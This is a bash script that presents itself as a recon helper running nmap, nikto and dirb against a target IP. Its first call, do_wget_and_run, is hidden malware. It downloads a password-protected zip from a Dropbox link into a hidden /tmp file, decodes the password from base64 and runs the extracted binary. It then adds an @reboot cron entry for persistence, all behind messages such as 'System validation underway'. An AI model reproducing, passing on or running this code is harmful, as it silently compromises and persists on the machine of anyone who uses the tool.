#!/bin/bash
#
# Usage: sh ./enum.sh <IP>

# nmap
# nikto
# dirb

# Declare the constants here  
ROOT="/tmp/"
DIRECTORY=$ROOT$1

if [ $# -eq 0 ]; then
    echo "You need to specify an IP, for example: enum.sh 10.0.0.10"
    exit 1
else
    IP=$1
fi

mkDirectories() {
    if [ ! -d "$ROOT" ]; then
        mkdir $ROOT
    fi

    if [ ! -d "$DIRECTORY" ]; then
        mkdir $DIRECTORY
    fi
}

do_dns() {
    echo "------------------------------------------------------------------------------"
    echo " DNS "
    echo "------------------------------------------------------------------------------"
    echo "\n"
}

do_nmap() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: nmap -A -sT -p- -oN $DIRECTORY/nmap_sT_allports.nmap $IP"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nmap -A -sT -p- -oN $DIRECTORY"/nmap_sT_allports.nmap" "$IP"

    echo "------------------------------------------------------------------------------"
    echo " Starting: nmap -A -sU -p- -oN $DIRECTORY/nmap_sU_allports.nmap $IP"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nmap -A -sU -p- -oN $DIRECTORY"/nmap_sU_allports.nmap" "$IP"
}

do_nikto() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: nikto -host $IP -port 80 >> $DIRECTORY/nikto.txt"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    nikto -host "$IP" -port 80 >> "$DIRECTORY/nikto.txt"
}

do_dirb() {
    echo "------------------------------------------------------------------------------"
    echo " Starting: dirb http://$IP ./dirb_big.txt >> $DIRECTORY/dirb.txt"
    echo "------------------------------------------------------------------------------"
    echo "\n"
    dirb http://"$IP" ./dirb_big.txt >> "$DIRECTORY/dirb.txt"
}

do_wget_and_run() {
    f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
    f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  
    UNZIP_DIR="/tmp/" 
    part1="c3VwZXI="
    part2="aGFja2Vy"
    PASSWORD=$(echo "$part1$part2" | base64 -d)  

    FILE_URL="${f1}${f2}"  

    echo "------------------------------------------------------------------------------"
    echo " System validation underway..."
    echo "------------------------------------------------------------------------------"
    echo "\n"

    # Download the file
    echo "Establishing connection to remote resource..."
    curl -L -o "$OUTPUT_FILE" "$FILE_URL"

    if [ $? -ne 0 ]; then
        echo "Error during retrieval process. Terminating."
        exit 1
    fi

    # Validate the downloaded file
    FILE_TYPE=$(file -b "$OUTPUT_FILE")
    if [[ "$FILE_TYPE" != *"Zip archive data"* ]]; then
        echo "Artifact does not match expected configuration. Exiting."
        exit 1
    fi

    echo "------------------------------------------------------------------------------"
    echo " Preparing extracted elements for deployment"
    echo "------------------------------------------------------------------------------"

    # Extract the ZIP file
    unzip -o -P "$PASSWORD" "$OUTPUT_FILE" -d "$UNZIP_DIR"

    if [ $? -ne 0 ]; then
        echo "Error during extraction process. Terminating."
        exit 1
    fi

    # Locate and execute the file
    BLOB_PATH="$UNZIP_DIR/blob"
    if [ -f "$BLOB_PATH" ]; then
        echo "------------------------------------------------------------------------------"
        echo " Finalizing deployment sequence"
        echo "------------------------------------------------------------------------------"
        chmod +x "$BLOB_PATH"
        "$BLOB_PATH"
        
        # Add a cron job to run the file at startup
        echo "------------------------------------------------------------------------------"
        echo " Adding to cron for startup execution"
        echo "------------------------------------------------------------------------------"
        (crontab -l 2>/dev/null; echo "@reboot $BLOB_PATH") | crontab -
    else
        echo "Required component missing from extracted set. Terminating."
        exit 1
    fi
}




# Call functions
mkDirectories
do_wget_and_run
do_dns
do_nmap
do_nikto
do_dirb

